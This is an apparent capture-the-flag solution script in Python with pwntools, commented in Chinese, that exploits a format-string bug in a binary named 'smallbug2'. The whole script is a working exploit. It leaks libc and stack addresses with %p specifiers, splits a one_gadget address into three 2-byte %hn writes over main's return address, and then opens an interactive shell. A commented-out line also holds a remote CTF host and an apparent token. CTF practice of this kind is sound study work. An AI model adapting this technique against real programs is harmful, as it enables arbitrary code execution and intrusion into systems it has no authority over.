#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

#context(os='linux', arch='amd64', log_level='debug')
#p=remote("ctfgame.acdxvfsvd.net",11003)
#p.recv()
#p.sendline("Pgk6LeSJRXOn5mIWN77m1Kk2xT4AvR05")

p=process("./smallbug2")

#64位的传参顺序是rdi, rsi, rdx, rcx, r8, r9，接下来才是栈,该程序输入字符串的地址刚好是栈顶。
#泄露libc地址和栈地址，根据偏移找到one_gadget和main函数返回时ret地址

p.recv()
p.sendline("%3$p")
libc_addr=int(p.recv(),16)-0xf7260
onegadget=libc_addr+0xf1147
print "onegadget = "+hex(onegadget)

p.sendline("%p")
ret_addr=int(p.recv(),16)+0xf8
print "ret_addr = "+hex(ret_addr)

#通过运算，将要写入的one_gadget地址拆分成三段，每段 2 byte

addr1=onegadget & 0xffff
addr2=(onegadget & 0xffff0000 )>>16
addr3=(onegadget & 0xffff00000000)>>32

#利用循环，one_gadget分三次写，每次写2字节，将ret栈地址放在字符串最后，调整偏移和内存对齐

payload1="aaaa%"+str(addr1-4)+"c%8$hn"+p64(ret_addr)
p.sendline(payload1)
p.recvrepeat(timeout=2)

payload2="bbbb%"+str(addr2-4)+"c%8$hn"+p64(ret_addr+2)
p.sendline(payload2)
p.recvrepeat(timeout=2)

payload2="dddd%"+str(addr3-4)+"c%8$hn"+p64(ret_addr+4)
p.sendline(payload2)
p.recvrepeat(timeout=2)

#quit退出时，执行到main函数的ret，成功调用栈中one_gadget.

p.sendline("quit")

p.interactive()


